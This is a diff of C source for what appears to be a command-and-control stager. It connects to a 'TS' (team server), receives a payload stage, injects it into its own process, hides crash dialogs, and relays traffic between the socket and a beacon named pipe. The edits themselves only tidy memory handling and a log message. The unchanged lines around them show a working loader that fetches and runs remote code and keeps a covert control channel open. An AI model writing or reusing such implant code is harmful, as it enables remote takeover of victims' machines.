@@ -257,13 +257,6 @@ void main(int argc, char* argv[])
 	time_t time_seed;
 	srand((unsigned int) time(&time_seed));
 	
-	// pointer to data received 
-	char* random_line = malloc(512*sizeof(unsigned char));
-	// Count of bytes recieved
-	DWORD byte_counter = 0;
-	// The decoded byte received 
-	unsigned char byte = 0;
-
 	// Disable crash messages
 	SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX);
 	// _set_abort_behavior(0,_WRITE_ABORT_MSG);
@@ -299,7 +292,7 @@ void main(int argc, char* argv[])
 
 	//Receive initial payload data
 	printf("Recieving initial payload data");
-	DWORD read_size = recvData(sockfd, random_line, 512);
+	DWORD read_size = recvData(sockfd, payload, BUFFER_MAX_SIZE);
 	if (read_size < 0) 
 	{
 		printf("recvData error, exiting\n");
@@ -307,7 +300,7 @@ void main(int argc, char* argv[])
 		exit(1);
 	}
 
-	printf("Recv %d byte payload from TS\n", byte_counter);
+	printf("Recv %d byte payload from TS\n", read_size);
 	/* inject the payload stage into the current process */
 
 	printf("Injecting payload stage into current process.");
@@ -335,9 +328,6 @@ void main(int argc, char* argv[])
 		exit(1);
 	}
 
-	//free line
-	free(random_line);
-
 
 
 	// The pipe dance
@@ -362,12 +352,10 @@ void main(int argc, char* argv[])
 		read_size = recvData(sockfd, buffer, BUFFER_MAX_SIZE);
 		
 		printf("Recv %d bytes from TS\n", read_size);
-		free(random_line);
 		write_frame(beaconPipe, buffer, read_size);
 		printf("Sent to beacon\n");
 	}
 	//Free all allocated memory and close all memory leaks 
-	free(random_line);
 	free(payload);
 	free(buffer);
 	closesocket(sockfd);
